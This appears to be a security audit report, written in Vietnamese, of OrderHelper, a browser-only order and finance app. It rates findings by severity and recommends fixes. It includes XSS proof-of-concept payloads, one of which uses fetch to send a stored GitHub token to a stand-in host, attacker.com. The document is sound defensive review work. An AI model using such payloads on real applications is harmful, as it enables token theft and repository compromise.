# Security Review Report — OrderHelper

**Ngày review:** 2026-02-22
**Branch:** `claude/security-review-0JttL`
**Phạm vi:** Full codebase (`order_helper_v3_advanced.html`, `js/`, `css/`, `.github/`)

---

## Tóm tắt điều hành

OrderHelper là ứng dụng SPA (Single Page Application) quản lý đơn hàng, theo dõi tài chính và VIP chạy hoàn toàn trên client-side (browser). Review phát hiện **2 lỗ hổng CRITICAL**, **3 HIGH**, **5 MEDIUM** và **2 LOW** cần được xử lý trước khi triển khai rộng.

---

## Phân loại lỗ hổng

| Mức độ   | Số lượng | Tóm tắt |
|----------|----------|---------|
| CRITICAL | 2        | Stored XSS toàn diện, GitHub token lộ qua XSS |
| HIGH     | 3        | Debug log lộ dữ liệu nhạy cảm, không có CSP, inline event handlers |
| MEDIUM   | 5        | Không có authn/authz, URL-param feature toggle, hardcoded path, dữ liệu thực trong repo, dữ liệu localStorage không mã hóa |
| LOW      | 2        | Thiếu security headers, external CDN dependency |

---

## Chi tiết lỗ hổng

---

### [CRITICAL-1] Stored XSS — Unsanitized User Data trong innerHTML

**Mô tả:**
Nhiều vị trí trong ứng dụng render dữ liệu người dùng (tên khách hàng, tên món ăn) trực tiếp vào HTML thông qua `innerHTML` mà không qua bất kỳ bước sanitize nào. Dữ liệu này được lưu vào `localStorage` và hiển thị lại mỗi lần tải trang, tạo thành **Stored XSS**.

**Các vị trí bị ảnh hưởng:**

| File | Dòng | Đoạn code dễ bị tấn công |
|------|------|--------------------------|
| `order_helper_v3_advanced.html` | 2867–2873 | `<input value="${p.name \|\| ''}">` trong `applyPeopleToTable()` |
| `order_helper_v3_advanced.html` | 3313–3319 | `<input value="${finalName}">` trong `parseQuickInput()` |
| `order_helper_v3_advanced.html` | 4140 | `<td>${d.name}</td>` trong modal chi tiết đơn hàng |
| `order_helper_v3_advanced.html` | 4092 | `${order.itemName}` trong modal detail |
| `order_helper_v3_advanced.html` | 4584 | `${o.itemName}` trong bảng công nợ |
| `order_helper_v3_advanced.html` | 1222 | `<strong>${tx.name}</strong>` trong VIP history |
| `order_helper_v3_advanced.html` | 3787 | `${m.name}` trong summary section |
| `order_helper_v3_advanced.html` | 1989 | `onclick="goToVip('${vip.name}')"` và `${vip.name}` trong search results |
| `order_helper_v3_advanced.html` | 2028 | `onclick="searchOrdersByItem('${item.name}')"` trong search results |
| `order_helper_v3_advanced.html` | 2031 | `${item.name}` trong search results |
| `order_helper_v3_advanced.html` | 4560 | `${name}` trong debt details |

**Proof-of-Concept (PoC):**
Nhập tên khách hàng sau vào ô "Nhập nhanh":

```
"><img src=x onerror=alert(document.cookie)>
```

Khi đơn hàng được lưu và hiển thị lại (history, debt, search), script sẽ thực thi.

**Tác động:**
- Thực thi JavaScript tùy ý trong ngữ cảnh ứng dụng
- Đánh cắp toàn bộ dữ liệu `localStorage` (bao gồm GitHub token — xem CRITICAL-2)
- Chiếm quyền điều khiển session ứng dụng

**Khuyến nghị:**
Tạo hàm `escapeHtml()` và sử dụng trong mọi vị trí render dữ liệu vào innerHTML:

```javascript
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

Hoặc ưu tiên sử dụng `textContent` / `createElement` + `setAttribute` thay vì template literals trong `innerHTML`.

---

### [CRITICAL-2] GitHub Personal Access Token Lộ qua XSS

**Mô tả:**
GitHub Personal Access Token (PAT) được lưu plaintext trong `localStorage` tại key `github_token`. Khi kết hợp với lỗ hổng CRITICAL-1, kẻ tấn công có thể đánh cắp token này.

**Vị trí:**

```javascript
// order_helper_v3_advanced.html:2120
localStorage.setItem(GITHUB_TOKEN_KEY, token);  // GITHUB_TOKEN_KEY = 'github_token'
```

**PoC khai thác chuỗi (CRITICAL-1 → CRITICAL-2):**
Nhập tên khách hàng:
```
"><img src=x onerror="fetch('https://attacker.com?t='+localStorage.getItem('github_token'))">
```

Attacker nhận được GitHub token và có toàn quyền truy cập repository.

**Tác động:**
- Attacker có thể đọc/ghi/xóa nội dung repository GitHub
- Xóa lịch sử backup, commit mã độc, hoặc đánh cắp toàn bộ dữ liệu backup

**Khuyến nghị:**
1. **Ngắn hạn:** Fix XSS (CRITICAL-1) trước — loại bỏ vector tấn công chính
2. **Trung hạn:** Không lưu token trong `localStorage`. Dùng `sessionStorage` (chỉ tồn tại trong tab, mất khi đóng tab) hoặc yêu cầu nhập token mỗi session
3. **Dài hạn:** Xem xét sử dụng GitHub OAuth App + backend proxy để không expose token ra client

---

### [HIGH-1] Sensitive Data Lộ qua console.log

**Mô tả:**
Nhiều câu lệnh `console.log` ghi ra thông tin nhạy cảm của khách hàng vào browser console — có thể bị đọc bởi bất kỳ ai có quyền truy cập DevTools (trên thiết bị dùng chung, hoặc qua XSS).

**Vị trí:**

```javascript
// order_helper_v3_advanced.html:1241-1282
console.log('=== DEBUG getVipOrderTransactions ===');
console.log('Looking for VIP:', vipName, '(normalized:', normalizedVipName + ')');
console.log('Total orders in history:', orderHistory.length);
// ...
console.log('First order structure:', { id, ts, itemName, detailsLength });
// ...
console.log('✅ MATCH FOUND:', detailName, 'due:', detail.due);
```

**Tác động:**
Lộ tên khách hàng, số tiền, trạng thái thanh toán cho người dùng không có quyền truy cập dữ liệu.

**Khuyến nghị:**
Xóa tất cả câu lệnh `console.log` chứa thông tin nhạy cảm trước khi deploy production. Cân nhắc dùng một wrapper logging có thể tắt theo environment.

---

### [HIGH-2] Không có Content Security Policy (CSP)

**Mô tả:**
Ứng dụng không có CSP header hoặc CSP meta tag, cho phép script từ bất kỳ nguồn nào thực thi nếu có XSS.

**Vị trí:** `order_helper_v3_advanced.html` — không có `<meta http-equiv="Content-Security-Policy">`

**Khuyến nghị:**
Thêm CSP meta tag:

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self';
           style-src 'self' https://fonts.googleapis.com;
           font-src https://fonts.gstatic.com;
           connect-src https://api.github.com;">
```

**Lưu ý:** CSP chỉ hiệu quả sau khi đã loại bỏ tất cả inline event handlers (`onclick="..."`) và inline scripts (`<script>` tag inline).

---

### [HIGH-3] Inline Event Handlers Mở Rộng Attack Surface

**Mô tả:**
Toàn bộ ứng dụng sử dụng inline event handlers (`onclick="..."`, `oninput="..."`, `onfocus="..."`). Điều này:
1. Ngăn triển khai CSP hiệu quả
2. Mở rộng attack surface cho XSS (onclick có thể bị inject như đã thấy tại CRITICAL-1)

**Ví dụ:**
```html
<!-- order_helper_v3_advanced.html:35-36 -->
<input oninput="handleGlobalSearch(this.value)" onfocus="this.select()">

<!-- order_helper_v3_advanced.html:1989 -->
<div onclick="goToVip('${vip.name}')">  <!-- VIP name injected vào onclick -->
```

**Khuyến nghị:**
Chuyển sang `addEventListener` trong JavaScript. Đặc biệt ưu tiên loại bỏ inline handlers ở các vị trí có dữ liệu từ storage được inject vào.

---

### [MEDIUM-1] Không có Xác thực / Phân quyền

**Mô tả:**
Ứng dụng không có cơ chế đăng nhập hay phân quyền. Bất kỳ ai truy cập URL đều có thể xem toàn bộ lịch sử đơn hàng, số dư VIP, công nợ, và thực hiện mọi thao tác.

**Tác động:**
Nếu URL bị lộ (chia sẻ, đoán được), toàn bộ dữ liệu tài chính và khách hàng bị lộ.

**Khuyến nghị:**
Thêm mật khẩu đơn giản phía client (lưu hash trong localStorage hoặc dùng HTTP Basic Auth ở tầng hosting). Với dữ liệu tài chính thực, nên có backend với xác thực thực sự.

---

### [MEDIUM-2] URL Parameter Kiểm soát Tính năng Nhạy cảm

**Mô tả:**
`js/config.js:23` cho phép bất kỳ người dùng nào bật chế độ auto-backup bằng cách thêm `?autobackup=true` vào URL:

```javascript
AUTO_BACKUP_MODE: new URLSearchParams(window.location.search).get('autobackup') === 'true'
```

**Tác động:**
Bất kỳ visitor nào có thể kích hoạt auto-backup, khởi tạo API calls đến GitHub.

**Khuyến nghị:**
Chuyển `AUTO_BACKUP_MODE` sang cấu hình nội bộ (ví dụ: từ `localStorage` setting do user bật trong UI) thay vì URL parameter.

---

### [MEDIUM-3] Hardcoded Personal Information trong Source Code

**Mô tả:**
`js/config.js:6` chứa đường dẫn hệ thống cá nhân:

```javascript
DRAFT_DIR: '/Users/alvin/Library/Mobile Documents/com~apple~CloudDocs/Kitchen/drafts',
```

**Tác động:**
Lộ username (`alvin`), cấu trúc thư mục hệ thống, và thông tin về thiết bị. Nếu repository public, thông tin này bị lộ.

**Khuyến nghị:**
Di chuyển vào `localStorage` setting do user tự cấu hình, hoặc xóa nếu tính năng draft-to-iCloud không được dùng.

---

### [MEDIUM-4] Dữ liệu Thực trong Repository Git

**Mô tả:**
`kitchen_backup.json` và thư mục `DB/` (100+ files) chứa dữ liệu sản xuất thực: tên khách hàng thực, lịch sử giao dịch, số dư tài chính — tất cả được commit vào git.

**Tác động:**
- Nếu repository được push public, dữ liệu khách hàng bị lộ
- Dữ liệu lịch sử git không thể dễ dàng xóa

**Khuyến nghị:**
1. Thêm `DB/`, `kitchen_backup.json`, `*.json` vào `.gitignore`
2. Xem xét xóa lịch sử git chứa dữ liệu nhạy cảm (`git filter-repo`)
3. Đảm bảo repository ở chế độ **private**

---

### [MEDIUM-5] Dữ liệu Nhạy cảm Không Mã hóa trong localStorage

**Mô tả:**
Toàn bộ dữ liệu (lịch sử đơn hàng, số dư VIP, GitHub token) được lưu plaintext trong `localStorage`. Bất kỳ JavaScript nào trên cùng origin (hoặc qua XSS) đều có thể đọc toàn bộ.

**Khuyến nghị:**
Đây là hạn chế kiến trúc của client-only app. Giải pháp dài hạn là chuyển sang backend với database server-side. Ngắn hạn, fix lỗ hổng XSS là ưu tiên cao nhất.

---

### [LOW-1] Thiếu Security Headers

**Mô tả:**
Không có các HTTP security headers như:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: no-referrer`

**Khuyến nghị:**
Cấu hình tại tầng hosting (GitHub Pages có hỗ trợ hạn chế; cân nhắc dùng Cloudflare hoặc tương tự).

---

### [LOW-2] External CDN Dependency (Google Fonts)

**Mô tả:**
Font Inter được load từ `fonts.googleapis.com` và `fonts.gstatic.com`:

```html
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
```

**Tác động:**
- Google theo dõi được IP của người dùng
- Nếu CDN bị compromise, CSS độc hại có thể được inject

**Khuyến nghị:**
Self-host font Inter, hoặc dùng system font stack.

---

## Thứ tự ưu tiên xử lý

| Ưu tiên | Lỗ hổng | Lý do |
|---------|---------|-------|
| 1 | CRITICAL-1: Stored XSS | Attack surface rộng, ảnh hưởng trực tiếp đến mọi người dùng |
| 2 | CRITICAL-2: GitHub Token lộ | Hậu quả nghiêm trọng khi kết hợp với XSS |
| 3 | HIGH-1: console.log | Dễ fix, loại bỏ ngay debug code |
| 4 | MEDIUM-3: Hardcoded path | Dễ fix |
| 5 | MEDIUM-4: Real data in repo | Cần xử lý trước khi repo có thể public |
| 6 | HIGH-2 & HIGH-3: CSP + event handlers | Cần refactor, làm sau khi fix XSS |
| 7 | Các lỗ hổng còn lại | Xử lý theo lộ trình |

---

## Kết luận

Lỗ hổng **Stored XSS** kết hợp với **GitHub token trong localStorage** tạo thành một chuỗi tấn công hoàn chỉnh với tác động nghiêm trọng. Đây là vấn đề cần được ưu tiên fix **ngay lập tức**.

Fix cốt lõi chỉ cần thêm một hàm `escapeHtml()` và áp dụng trước mọi giá trị được đưa vào `innerHTML`. Toàn bộ các thay đổi này có thể thực hiện trong vài giờ và sẽ giảm thiểu đáng kể nguy cơ bảo mật.
